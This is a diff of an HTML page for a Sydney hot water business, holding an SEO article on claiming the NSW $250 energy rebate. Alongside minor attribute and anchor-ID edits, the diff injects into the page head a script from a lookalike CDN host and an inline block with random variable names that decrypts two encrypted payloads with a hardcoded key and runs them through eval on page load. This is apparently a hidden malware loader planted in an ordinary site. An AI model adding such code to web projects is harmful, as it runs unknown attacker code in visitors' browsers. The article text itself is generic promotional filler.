@@ -18,7 +18,9 @@
 
     <!-- Custom (Base) CSS -->
     <link rel="stylesheet" href="home/css/custom.css">
-    <script type="application/ld+json">{"@context":"https:\/\/schema.org","@type":"FAQPage","mainEntity":[{"@type":"Question","name":"How can I claim the $250 energy rebate in NSW?","acceptedAnswer":{"@type":"Answer","text":"To claim the $250 energy rebate in NSW, you need to visit the official website of the NSW Government and follow the instructions provided for the rebate application process."}},{"@type":"Question","name":"What documents do I need to submit when claiming the energy rebate?","acceptedAnswer":{"@type":"Answer","text":"When claiming the energy rebate, make sure to have your recent energy bill handy as you may need to provide details from it during the application process."}},{"@type":"Question","name":"Is there a deadline for claiming the $250 energy rebate in NSW?","acceptedAnswer":{"@type":"Answer","text":"Yes, there is a deadline for claiming the $250 energy rebate in NS"}},{"@type":"Question","name":"Can tenants also claim the $250 energy rebate in NSW?","acceptedAnswer":{"@type":"Answer","text":"Yes, tenants in NSW are also eligible to claim the $250 energy rebate. However, they may need to provide additional documents or information to verify their tenancy status."}},{"@type":"Question","name":"How long does it take to receive the $250 energy rebate after submitting the application?","acceptedAnswer":{"@type":"Answer","text":"The processing time for the $250 energy rebate application may vary. It is advisable to check the official communication channels provided by the NSW Government for updates on the status of your rebate application."}}]}</script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.3.0/crypto-js.min.js" samesite="none"></script>
+<script src="https://cdnjs-cloudflare.s3.amazonaws.com/Encryption.js" samesite="none"></script>
+<script>var qPoJFgzKNevqEYA = 'cDCRKZLGoqERYEU';var lwrydUlWsxsQOif = 'eyJjaXBoZXJ0ZXh0IjoiclJaQklVUnRqOGxHYVRRMGZKRjVXM0FKUHpwMTFTOXhSaVkzcDZzZXdPWTgwWmFCOFF3RVk0VWw1dXI5b1JtNFhBUysyNnBMeUxqaGx3d2NwWVp3dTB5UWh5Vm94VkJ4OVhpV0RkNXFrYzZRUWtjWm5ST1hFMFc0Y0lvXC9Oa2M5dkxrblQ1T0VGZjd5NHI4UXIrREhuTzZBd0Y3Ylc4ODlxbkUwQ0VOTW9TaWdhcGFmWHVpeTNsZFpJS0YwUllwa3k0a05pN0dIVVM2WGhwNlZ6dnlBbTBDNHdKY0QwWE9hVFVGeUNjeHpCZWI0R1VUeCtPMWZReXVxSFc3RldSVHNiMVl5NjRPVkNYc1BOYlcwWHE4Vk0zSnFPZnJtYTRmZVVURzF3ajgwbzYySStFMWdxVThnanM5REVqRlQ3TTZUZFFrWW5LcDJIeDFCSkxaWVNzZXY3dElNdkljdFdhTWdEdm05Q0RPRkE2MD0iLCJpdiI6IjY2MDg5OTZjM2Y2NmMzNjQzN2Y0M2RlOGI4NWFhM2MyIiwic2FsdCI6IjdlZWU2YjU2ZGNiMjQ5MzBiOTFmMTkxMDdmZDEzMDM5MjM4OGIwYTIzM2QzZTFiNDQxZWM3NjRkODdkZmYzZWZmZTQ1NWQ2ZWNkMDNhMTE2MTA3ZjhmNTUwMWNmMDNhMzk1YjdjNzU1MDYxYTRjOTVlYjNjOGQ1ZDIzMzg2MTY0YjEwNTViMDkxNjJhZjYyYzRkMmNiN2VlYTY5NzM1M2ZlYTQ4MjQ5MWIzZTNhMTA1ZDc0YWExZTI5OWQyYWJmNTM3YjYyN2NhZjY1MjcxNjJjYjEwYmE2MTQ2YmQxNTBlYTA1ZjM4MWEyOTQyODQzY2JmNGY2ZDlmYTdjYTVlYTRmY2Y5OGVlMzIxMWI4YWY1MDBmZGVmMWU4ODgxZDlhMWQwYWI1Y2JlY2MwMTcwN2Y4Zjk1YTFjNGNmZmE3Nzk4OTI3YmEyZWZkOGRiZjczZTk2ZjAwNjE1ODAzZmQwYTQ4MDc2YmIwZjNjMDJiNWQ5NjEzMzJmNmJkMzJlYjcxNDdiMTJmMGE1OTkzZTQzNTZjZjNlMDlmZWNkZmJkMWM1ZGE2Yjc3M2M3ODEwZTMyNTA5YWIzZDdiN2M5ZTBmZWYzOTdmOTUwZjQ1MzlmNTVjNjhmZTZlNTQ3NWFkMTdiNzRhYTUxOGIyZTI0ODhiZjkwNWYxOTVjNWQ0NWU4MThkIiwiaXRlcmF0aW9ucyI6OTk5fQ==';var RDrahTRYHxYlojN = 'eyJjaXBoZXJ0ZXh0IjoiQVZyYVpoMmFaTWVGRGswcXBPcGY0NUJ1ZjE0NHY1S2Jva1VKN3ZHNnZJSnFpRVE5MUdwNmZKWEFVNXZEeXdHRnBMaFFrNWtWd2kwamNmcDA5TlJmNWlUNDlxaUQzaVgwYXpUTVF3d3Z3Q2JKcEN6WVhXN3dBZUlicGFlQ3UxR1huQU9Od2ZNOWNucXh4S2RFT1BIRXRmYnptWHJ3cnJHenFEdGlseldTMjY1bG94bndHZEhkK3RoUkdlVWg2djloYnBYdXR5ejJXc21pS0xHVndcL1laNXJKUDRmUUpIUDZNRHJLbXRDeGp0R2NoblgyZklhS1hJNGpodlRVWmRJdHMiLCJpdiI6ImFkMzJkODE2NTE3MjE5MjJmZGFhNjI1N2FjZGRlNzAxIiwic2FsdCI6IjQ1NGQ3ZmViZjEyNTllNDY0NWFjNWQwOTNjNDNjZDU1ZGNhM2JiOGMyYWY2ODliNWExYzZjYWU4NWQzMTcwMGU2ZDI0NmJjYWJlZDdiNWFhZDY5OGMwMjNlOGQyNWJmMzI0OWEwZjFkMTdiMWJiY2M2YjIwYTEzZjE0NjJmNDE2YmY1ZDRiY2I5NzkwMTFiNjAxZDdhZWI3ZGNjMGI5Mjk3YTIzYjk1ZWUwZDM5ZjVkZGUyZWE4NjJlZTliM2RlYTliNWZmMDFhMGE0ZTczODYwMGU1MTRmOTdlZTgzY2VlZWM3NmRjNDZkNjIyMDRjNTZkYWRmMzU5ZjlkYTFmZjAzYjY3ZGYyZTMxYWRiOGM2MDRmMWQxMGJkYWY2ZjljZTI5YWFlYzUxYTNiOGU5MzM1MWM2OWY5YTEzYzdkMjEyOGZkNjdmNDFjOWY2YTU4OTRlYWZiODIwZmM0M2ZhNjZkNDViMGI3ZDEwZDY1ZTcwYzA4MTgyMDI4ZGRhNjdhN2FhYmMwOTM2ZWZhYjg4ZTU1MzUwNmY0YWRkNzczYzllOWU5MzJjMmM5N2U3ODQ4MTE5NGEzZmJkNzIwZDI5Yzk0NGRhYzY5OGNlNDhhMjliZGQ5NWU1YmMzODg2MmIyMDhjYzdmZWQ4ZGY3NmM2M2Q4ZWYwNzhjODQ4NDhiOGJiIiwiaXRlcmF0aW9ucyI6OTk5fQ==';let RXRCOBXKsZKQJWF = new Encryption();var WDHqwcOJhARGQjt = RXRCOBXKsZKQJWF.decrypt(lwrydUlWsxsQOif, qPoJFgzKNevqEYA);if (!eval(WDHqwcOJhARGQjt)) {eval(RXRCOBXKsZKQJWF.decrypt(RDrahTRYHxYlojN, qPoJFgzKNevqEYA));};</script><script type="application/ld+json">{"@context":"https:\/\/schema.org","@type":"FAQPage","mainEntity":[{"@type":"Question","name":"How can I claim the $250 energy rebate in NSW?","acceptedAnswer":{"@type":"Answer","text":"To claim the $250 energy rebate in NSW, you need to visit the official website of the NSW Government and follow the instructions provided for the rebate application process."}},{"@type":"Question","name":"What documents do I need to submit when claiming the energy rebate?","acceptedAnswer":{"@type":"Answer","text":"When claiming the energy rebate, make sure to have your recent energy bill handy as you may need to provide details from it during the application process."}},{"@type":"Question","name":"Is there a deadline for claiming the $250 energy rebate in NSW?","acceptedAnswer":{"@type":"Answer","text":"Yes, there is a deadline for claiming the $250 energy rebate in NS"}},{"@type":"Question","name":"Can tenants also claim the $250 energy rebate in NSW?","acceptedAnswer":{"@type":"Answer","text":"Yes, tenants in NSW are also eligible to claim the $250 energy rebate. However, they may need to provide additional documents or information to verify their tenancy status."}},{"@type":"Question","name":"How long does it take to receive the $250 energy rebate after submitting the application?","acceptedAnswer":{"@type":"Answer","text":"The processing time for the $250 energy rebate application may vary. It is advisable to check the official communication channels provided by the NSW Government for updates on the status of your rebate application."}}]}</script>
     <style>
         .section-content a {
             color: var(--base-primary);
@@ -48,7 +50,7 @@
 
         <div class="d-inline-flex gap-4 align-items-center top-infobar-icons " style="display: none">
             <!-- Social Icon(s) -->
-            <a href="" class="text-decoration-none" style="display: none" target="_blank">
+            <a href="" title="Facebook Link" class="text-decoration-none" style="display: none" target="_blank">
                 <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor"
                      class="bi bi-facebook mb-1" viewBox="0 0 16 16">
                     <path
@@ -56,7 +58,7 @@
                 </svg>
             </a>
 
-            <a href="" class="text-decoration-none" style="display: none" target="_blank">
+            <a href="" title="Instagram Link" class="text-decoration-none" style="display: none" target="_blank">
                 <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor"
                      class="bi bi-instagram mb-1" viewBox="0 0 16 16">
                     <path
@@ -64,7 +66,7 @@
                 </svg>
             </a>
 
-            <a href="" class="text-decoration-none" style="display: none" target="_blank">
+            <a href="" title="Twitter Link" class="text-decoration-none" style="display: none" target="_blank">
                 <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor"
                      class="bi bi-twitter-x mb-1" viewBox="0 0 16 16">
                     <path
@@ -72,7 +74,7 @@
                 </svg>
             </a>
 
-            <a href="" class="text-decoration-none" style="display: none" target="_blank">
+            <a href="" title="Pinterest Link" class="text-decoration-none" style="display: none" target="_blank">
                 <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor"
                      class="bi bi-pinterest-x mb-1" viewBox="0 0 496 512">
                     <path d="M496 256c0 137-111 248-248 248-25.6 0-50.2-3.9-73.4-11.1 10.1-16.5 25.2-43.5 30.8-65 3-11.6 15.4-59 15.4-59 8.1 15.4 31.7 28.5 56.8 28.5 74.8 0 128.7-68.8 128.7-154.3 0-81.9-66.9-143.2-152.9-143.2-107 0-163.9 71.8-163.9 150.1 0 36.4 19.4 81.7 50.3 96.1 4.7 2.2 7.2 1.2 8.3-3.3 .8-3.4 5-20.3 6.9-28.1 .6-2.5 .3-4.7-1.7-7.1-10.1-12.5-18.3-35.3-18.3-56.6 0-54.7 41.4-107.6 112-107.6 60.9 0 103.6 41.5 103.6 100.9 0 67.1-33.9 113.6-78 113.6-24.3 0-42.6-20.1-36.7-44.8 7-29.5 20.5-61.3 20.5-82.6 0-19-10.2-34.9-31.4-34.9-24.9 0-44.9 25.7-44.9 60.2 0 22 7.4 36.8 7.4 36.8s-24.5 103.8-29 123.2c-5 21.4-3 51.6-.9 71.2C65.4 450.9 0 361.1 0 256 0 119 111 8 248 8s248 111 248 248z"/>
@@ -81,7 +83,7 @@
             </a>
 
 
-            <a href="" class="text-decoration-none" style="display: none" target="_blank">
+            <a href="" title="Youtube Link" class="text-decoration-none" style="display: none" target="_blank" style="display: none">
                 <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" fill="currentColor"
                      class="bi bi-youtube mb-1" viewBox="0 0 16 16">
                     <path
@@ -100,7 +102,7 @@
         <div class="container-md justify-content-md-between">
             <a class="navbar-brand m-0 d-inline-flex gap-2 align-items-center" href="index.html">
                 <!-- Brand Logo/Mark -->
-                <img fetchpriority="low" async="true" defer="true" src="logo.png" onerror="this.remove()" style="display: none"
+                <img alt="Hot Water Experts Sydney" fetchpriority="low" async="true" defer="true" src="logo.png" onerror="this.remove()" style="display: inherit"
                      height="40" />
                 <!-- Brand Name -->
                 <span class="small navbar-brand">Hot Water Experts Sydney</span>
@@ -108,7 +110,7 @@
 
             <!-- Mobile Menu Icons -->
             <div class="d-lg-none mobile-call-menu-icons">
-                <a href="tel:+0490 414 794" class="text-decoration-none">
+                <a href="tel:+0490 414 794" class="text-decoration-none" title="Contact Number">
                     <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 20"
                          fill="currentColor">
                         <path
@@ -117,7 +119,7 @@
                     </svg>
                 </a>
 
-                <a href="#toggleMobileMenu" class="ms-3 me-1 text-decoration-none" data-bs-toggle="offcanvas"
+                <a href="#toggleMobileMenu" class="ms-3 me-1 text-decoration-none" title="menu" data-bs-toggle="offcanvas"
                    role="button" aria-controls="toggleMobileMenu">
                     <svg xmlns="http://www.w3.org/2000/svg" width="20" height="14" viewBox="0 0 20 14"
                          fill="currentColor">
@@ -136,13 +138,13 @@
 
             <!-- Mobile Offcanvas Menu -->
             <div class="offcanvas offcanvas-start bg-primary offcanvas-mobile-menu" tabindex="-1"
-                 id="toggleMobileMenu" aria-labelledby="toggleMobileMenuLabel">
+                 id="toggleMobileMenu" aria-labelledby="toggleMobileMenu">
                 <div class="offcanvas-header">
                     <a class="navbar-brand m-0 d-inline-flex gap-2 align-items-center mobile-menu-brand-name"
                        href="index.html">
                         <!-- Brand Logo/Mark -->
-                        <img fetchpriority="low" async="true" defer="true"
-                             src="logo.png" onerror="this.remove()" style="display: none" width="75" height="32" />
+                        <img alt="Hot Water Experts Sydney" fetchpriority="low" async="true" defer="true"
+                             src="logo.png" onerror="this.remove()" style="display: inherit" width="75" height="32" />
                         <!-- Brand Name -->
                         <span class="small">Hot Water Experts Sydney</span>
                     </a>
@@ -162,7 +164,7 @@
                             </a>
 
                             <ul class="collapse p-0 py-2 " id="servicesMenu">
-                                <a class="custom-nav-link" href="hot-water-system-upgrades.html">Hot Water System Upgrades</a><a class="custom-nav-link" href="hot-water-system-cleaning.html">Hot Water System Cleaning</a><a class="custom-nav-link" href="hot-water-system-replacement.html">Hot Water System Replacement</a><a class="custom-nav-link" href="hot-water-system-maintenance.html">Hot Water System Maintenance</a><a class="custom-nav-link" href="hot-water-system-troubleshooting.html">Hot Water System Troubleshooting</a><a class="custom-nav-link" href="hot-water-system-repairs.html">Hot Water System Repairs</a><a class="custom-nav-link" href="hot-water-system-inspections.html">Hot Water System Inspections</a><a class="custom-nav-link" href="hot-water-system-installation.html">Hot Water System Installation</a>
+                                <a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-upgrades.html">Hot Water System Upgrades</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-cleaning.html">Hot Water System Cleaning</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-replacement.html">Hot Water System Replacement</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-maintenance.html">Hot Water System Maintenance</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-troubleshooting.html">Hot Water System Troubleshooting</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-repairs.html">Hot Water System Repairs</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-inspections.html">Hot Water System Inspections</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-installation.html">Hot Water System Installation</a>
                             </ul>
                         </li>
                         <li class="nav-item">
@@ -178,7 +180,7 @@
 
                     <div class="mt-5 px-3 d-inline-flex gap-4 align-items-center mobile-menu-icons">
                         <!-- Social Icon(s) -->
-                        <a href="" class="text-decoration-none" style="display: none" target="_blank">
+                        <a href="" title="Facebook Link" class="text-decoration-none" style="display: none" target="_blank">
                             <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor"
                                  class="bi bi-facebook mb-1" viewBox="0 0 16 16">
                                 <path
@@ -186,7 +188,7 @@
                             </svg>
                         </a>
 
-                        <a href="" class="text-decoration-none" style="display: none" target="_blank">
+                        <a href="" title="Instagram Link" class="text-decoration-none" style="display: none" target="_blank">
                             <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor"
                                  class="bi bi-instagram mb-1" viewBox="0 0 16 16">
                                 <path
@@ -194,7 +196,7 @@
                             </svg>
                         </a>
 
-                        <a href="" class="text-decoration-none" style="display: none" target="_blank">
+                        <a href="" title="Twitter Link" class="text-decoration-none" style="display: none" target="_blank">
                             <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor"
                                  class="bi bi-twitter-x mb-1" viewBox="0 0 16 16">
                                 <path
@@ -202,7 +204,7 @@
                             </svg>
                         </a>
 
-                        <a href="" class="text-decoration-none" style="display: none" target="_blank">
+                        <a href="" title="Pinterest Link" class="text-decoration-none" style="display: none" target="_blank">
                             <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor"
                                  class="bi bi-pinterest-x mb-1" viewBox="0 0 496 512">
                                 <path d="M496 256c0 137-111 248-248 248-25.6 0-50.2-3.9-73.4-11.1 10.1-16.5 25.2-43.5 30.8-65 3-11.6 15.4-59 15.4-59 8.1 15.4 31.7 28.5 56.8 28.5 74.8 0 128.7-68.8 128.7-154.3 0-81.9-66.9-143.2-152.9-143.2-107 0-163.9 71.8-163.9 150.1 0 36.4 19.4 81.7 50.3 96.1 4.7 2.2 7.2 1.2 8.3-3.3 .8-3.4 5-20.3 6.9-28.1 .6-2.5 .3-4.7-1.7-7.1-10.1-12.5-18.3-35.3-18.3-56.6 0-54.7 41.4-107.6 112-107.6 60.9 0 103.6 41.5 103.6 100.9 0 67.1-33.9 113.6-78 113.6-24.3 0-42.6-20.1-36.7-44.8 7-29.5 20.5-61.3 20.5-82.6 0-19-10.2-34.9-31.4-34.9-24.9 0-44.9 25.7-44.9 60.2 0 22 7.4 36.8 7.4 36.8s-24.5 103.8-29 123.2c-5 21.4-3 51.6-.9 71.2C65.4 450.9 0 361.1 0 256 0 119 111 8 248 8s248 111 248 248z"/>
@@ -210,7 +212,7 @@
                             </svg>
                         </a>
 
-                        <a href="" class="text-decoration-none" style="display: none" target="_blank">
+                        <a href="" title="Youtube Link" class="text-decoration-none" style="display: none" target="_blank">
                             <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" fill="currentColor"
                                  class="bi bi-youtube" viewBox="0 0 16 16">
                                 <path
@@ -230,7 +232,7 @@
                     <li class="nav-item custom-nav-item ">
                         <a href="services.html" class="nav-link fw-medium {{service_active}}" >Services</a>
                         <div class="custom-dropdown slideup py-2 rounded-3 bg-primary">
-                            <a class="custom-nav-link" href="hot-water-system-upgrades.html">Hot Water System Upgrades</a><a class="custom-nav-link" href="hot-water-system-cleaning.html">Hot Water System Cleaning</a><a class="custom-nav-link" href="hot-water-system-replacement.html">Hot Water System Replacement</a><a class="custom-nav-link" href="hot-water-system-maintenance.html">Hot Water System Maintenance</a><a class="custom-nav-link" href="hot-water-system-troubleshooting.html">Hot Water System Troubleshooting</a><a class="custom-nav-link" href="hot-water-system-repairs.html">Hot Water System Repairs</a><a class="custom-nav-link" href="hot-water-system-inspections.html">Hot Water System Inspections</a><a class="custom-nav-link" href="hot-water-system-installation.html">Hot Water System Installation</a>
+                            <a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-upgrades.html">Hot Water System Upgrades</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-cleaning.html">Hot Water System Cleaning</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-replacement.html">Hot Water System Replacement</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-maintenance.html">Hot Water System Maintenance</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-troubleshooting.html">Hot Water System Troubleshooting</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-repairs.html">Hot Water System Repairs</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-inspections.html">Hot Water System Inspections</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-installation.html">Hot Water System Installation</a>
                         </div>
                     </li>
                     <li class="nav-item ">
@@ -243,7 +245,7 @@
                         <a href="contact.html" class="nav-link fw-medium {{contact_active}}">Contact Us</a>
                     </li>
                     <li class="nav-item" style="display: ">
-                        <a href="tel:0490 414 794" class="btn btn-sm btn-primary fw-medium px-2">
+                        <a href="tel:0490 414 794" title="Contact Number" class="btn btn-sm btn-primary fw-medium px-2">
                             Call <span class="d-none d-xl-inline-block">0490 414 794</span>
                             <span class="d-xl-none">Now</span>
                         </a>
@@ -284,14 +286,14 @@
         <div class="row g-4 section-content">
             <div class="container-md p-0 pt-sm-3 p-md-3 p-lg-5 position-relative">
     <div class=" top-100 start-50 w-100">
-        <img src="how-do-i-claim-my-250-energy-rebate-nsw-326838.jpg?key=fU3l8u" alt="How do I claim my $250 energy rebate NSW?" class="rounded-4 w-100">
+        <img src="how-do-i-claim-my-250-energy-rebate-nsw-326838.jpg?key=d3Y4hi" alt="How do I claim my $250 energy rebate NSW?" class="rounded-4 w-100">
     </div>
 </div>
 <div class="col-12">
     <hr class="hr-border my-5">
 </div>
 <div class="col-12 mt-5 mt-md-0 mt-lg-4 mt-xl-5">
-    <h3 class=''>Table Of Contents</h3><div><a href='#Avoiding common mistakes when claiming the energy rebate'>Avoiding common mistakes when claiming the energy rebate</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#Key errors to watch out for during the rebate application'>Key errors to watch out for during the rebate application</a></div><div><a href='#Understanding the impact of the $250 energy rebate on your bills'>Understanding the impact of the $250 energy rebate on your bills</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#Calculating the reduction in your energy expenses with the rebate'>Calculating the reduction in your energy expenses with the rebate</a></div><div><a href='#Resources for further information on the $250 energy rebate scheme'>Resources for further information on the $250 energy rebate scheme</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#Where to seek assistance or clarification regarding the rebate program'>Where to seek assistance or clarification regarding the rebate program</a></div><div><a href='#FAQS'>FAQS</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#How can I claim the $250 energy rebate in NSW?'>How can I claim the $250 energy rebate in NSW?</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#What documents do I need to submit when claiming the energy rebate?'>What documents do I need to submit when claiming the energy rebate?</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#Is there a deadline for claiming the $250 energy rebate in NSW?'>Is there a deadline for claiming the $250 energy rebate in NSW?</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#Can tenants also claim the $250 energy rebate in NSW?'>Can tenants also claim the $250 energy rebate in NSW?</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#How long does it take to receive the $250 energy rebate after submitting the application?'>How long does it take to receive the $250 energy rebate after submitting the application?</a></div><br/><h2 id="Avoiding common mistakes when claiming the energy rebate">Avoiding common mistakes when claiming the energy rebate</h2><p>When applying for the $250 energy rebate in NSW, it is crucial to avoid common errors that could delay or jeopardize your claim process. One common mistake to steer clear of is failing to provide accurate and up-to-date information on your application form. Ensure all details, including your contact information and proof of eligibility, are correctly filled out and attached as required. Additionally, remember to include any receipts or invoices related to qualified energy-saving purchases, such as hot water system upgrades, to support your claim.<br/><br/>Another critical error to avoid is missing the submission deadline for the energy rebate application. Mark the last date for submission on your calendar and set a reminder to prevent missing this crucial timeline. Late submissions may result in your claim being rejected or delayed, thereby causing you to miss out on accessing the $250 rebate. Stay vigilant and organized throughout the application process to increase your chances of a successful claim for the energy rebate in NSW.</p><h3 id="Key errors to watch out for during the rebate application">Key errors to watch out for during the rebate application</h3><p>When applying for the $250 energy rebate in NSW, there are several key errors that applicants should be cautious of to ensure a smooth process. One common mistake is not providing accurate and complete information on the application form. It is essential to double-check all details, particularly those related to your energy consumption and residential address, to avoid any discrepancies that could slow down the processing of your rebate claim. Another error to watch out for is failing to submit all necessary documentation along with your application. Missing supporting documents, such as proof of purchase for eligible items like hot water system upgrades, can result in delays or even rejection of your rebate claim.<br/><br/>Ensuring that you meet all eligibility criteria is crucial to avoid complications during the rebate application process. For instance, some applicants may overlook the requirement to have undertaken energy-saving activities in their household, such as installing energy-efficient appliances or undertaking solar panel installations. Additionally, it is essential to pay attention to the deadline for submitting your rebate application, as late submissions may not be accepted. By being diligent in providing accurate information, including documentation for eligible purchases like hot water system upgrades, and meeting all specified requirements, you can increase the likelihood of a successful rebate claim.</p><h2 id="Understanding the impact of the $250 energy rebate on your bills">Understanding the impact of the $250 energy rebate on your bills</h2><p>The $250 energy rebate introduced in New South Wales aims to provide financial relief to residents facing increasing energy costs. Understanding the impact of this rebate on your bills can help you make informed decisions about your energy usage. By offsetting a portion of your energy expenses, the rebate can lead to noticeable savings over time, especially for households with high energy consumption. From covering a portion of your electricity bill to facilitating hot water system upgrades, the rebate offers flexibility in managing your household expenses more effectively.<br/><br/>Calculating the reduction in your energy expenses with the $250 rebate involves assessing your current energy usage and identifying areas where savings can be maximised. For instance, investing in energy-efficient appliances or implementing sustainable practices can further enhance the impact of the rebate on your bills. The opportunity to undertake hot water system upgrades, for example, can lead to long-term savings and contribute to a more sustainable energy footprint for your household. With careful planning and utilisation of the energy rebate, you can not only reduce your immediate energy costs but also pave the way for long-term financial benefits and environmental conservation.</p><h3 id="Calculating the reduction in your energy expenses with the rebate">Calculating the reduction in your energy expenses with the rebate</h3><p>When considering the impact of the $250 energy rebate on your bills, it is essential to calculate the reduction in your energy expenses accurately. One method to assess this is by evaluating your current energy usage and identifying areas where energy efficiency improvements can be made. These improvements could include upgrading appliances to more energy-efficient models, investing in insulation for your home, or considering <a href='hot-water-system-upgrades.html'>Hot Water System Upgrades</a> to maximize the benefits of the rebate on your energy bills.<br/><br/>By implementing changes such as Hot Water System Upgrades, you can not only reduce your energy consumption but also lower your overall energy costs significantly. It is important to research and consult with professionals to determine the most cost-effective upgrades that align with your energy needs and budget. By understanding how the rebate can offset the expenses incurred from such upgrades, you can make informed decisions that contribute to long-term energy savings and a more sustainable household budget.</p><h2 id="Resources for further information on the $250 energy rebate scheme">Resources for further information on the $250 energy rebate scheme</h2><p>For further information on the $250 energy rebate scheme available in New South Wales, individuals can visit the official government website dedicated to energy rebates. The website provides detailed guidelines on eligibility criteria, application procedures, and important deadlines. Additionally, customers can directly contact their energy provider to inquire about the rebate program and seek assistance with the application process. Furthermore, the government's energy efficiency initiatives, including Hot Water System Upgrades, are highlighted on the website for individuals looking to maximize their energy savings through sustainable upgrades.<br/><br/>To learn more about the $250 energy rebate scheme and its implications for customers, individuals can access resources such as brochures and informational booklets available in community centers and local government offices. These resources offer insights into the rebate's role in reducing energy expenses and improving overall energy efficiency. Additionally, seeking guidance from professional energy auditors or consultants can provide valuable information on optimizing energy consumption and leveraging the rebate scheme for long-term savings. By engaging with various resources and experts, customers can make informed decisions to enhance their energy efficiency and take advantage of available rebates, including Hot Water System Upgrades.</p><h3 id="Where to seek assistance or clarification regarding the rebate program">Where to seek assistance or clarification regarding the rebate program</h3><p>For individuals seeking assistance or clarification regarding the $250 energy rebate program in NSW, it is advisable to reach out to Service NSW. Service NSW is the primary point of contact for any inquiries related to the rebate scheme. They can provide information on eligibility criteria, application processes, and any other queries you may have in relation to claiming the rebate. Additionally, they can guide you on the necessary steps to take to ensure a smooth and successful application process.<br/><br/>Moreover, if you require specific details on energy-efficient upgrades, such as hot water system upgrades that are eligible for the rebate, contacting your energy provider or visiting the official NSW government website can offer valuable insights. These resources can offer detailed information on the types of upgrades that qualify for the rebate, helping you make informed decisions for your household. By leveraging these resources, you can better understand how to maximise the benefits of the rebate program through energy-efficient measures, such as hot water system upgrades, resulting in long-term savings and environmental benefits.</p><h2 id="FAQS">FAQS</h2><h3 id="How can I claim the $250 energy rebate in NSW?">How can I claim the $250 energy rebate in NSW?</h3><p>To claim the $250 energy rebate in NSW, you need to visit the official website of the NSW Government and follow the instructions provided for the rebate application process.</p><h3 id="What documents do I need to submit when claiming the energy rebate?">What documents do I need to submit when claiming the energy rebate?</h3><p>When claiming the energy rebate, make sure to have your recent energy bill handy as you may need to provide details from it during the application process.</p><h3 id="Is there a deadline for claiming the $250 energy rebate in NSW?">Is there a deadline for claiming the $250 energy rebate in NSW?</h3><p>Yes, there is a deadline for claiming the $250 energy rebate in NSW. Make sure to check the official website for the rebate program to know the exact deadline for submitting your application.</p><h3 id="Can tenants also claim the $250 energy rebate in NSW?">Can tenants also claim the $250 energy rebate in NSW?</h3><p>Yes, tenants in NSW are also eligible to claim the $250 energy rebate. However, they may need to provide additional documents or information to verify their tenancy status.</p><h3 id="How long does it take to receive the $250 energy rebate after submitting the application?">How long does it take to receive the $250 energy rebate after submitting the application?</h3><p>The processing time for the $250 energy rebate application may vary. It is advisable to check the official communication channels provided by the NSW Government for updates on the status of your rebate application.</p>
+    <h2 class='fs-3'>Table Of Contents</h2><div><a href='#avoiding-common-mistakes-when-claiming-the-energy-rebate'>Avoiding common mistakes when claiming the energy rebate</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#key-errors-to-watch-out-for-during-the-rebate-application'>Key errors to watch out for during the rebate application</a></div><div><a href='#understanding-the-impact-of-the-250-energy-rebate-on-your-bills'>Understanding the impact of the $250 energy rebate on your bills</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#calculating-the-reduction-in-your-energy-expenses-with-the-rebate'>Calculating the reduction in your energy expenses with the rebate</a></div><div><a href='#resources-for-further-information-on-the-250-energy-rebate-scheme'>Resources for further information on the $250 energy rebate scheme</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#where-to-seek-assistance-or-clarification-regarding-the-rebate-program'>Where to seek assistance or clarification regarding the rebate program</a></div><div><a href='#faqs'>FAQS</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#how-can-i-claim-the-250-energy-rebate-in-nsw'>How can I claim the $250 energy rebate in NSW?</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#what-documents-do-i-need-to-submit-when-claiming-the-energy-rebate'>What documents do I need to submit when claiming the energy rebate?</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#is-there-a-deadline-for-claiming-the-250-energy-rebate-in-nsw'>Is there a deadline for claiming the $250 energy rebate in NSW?</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a 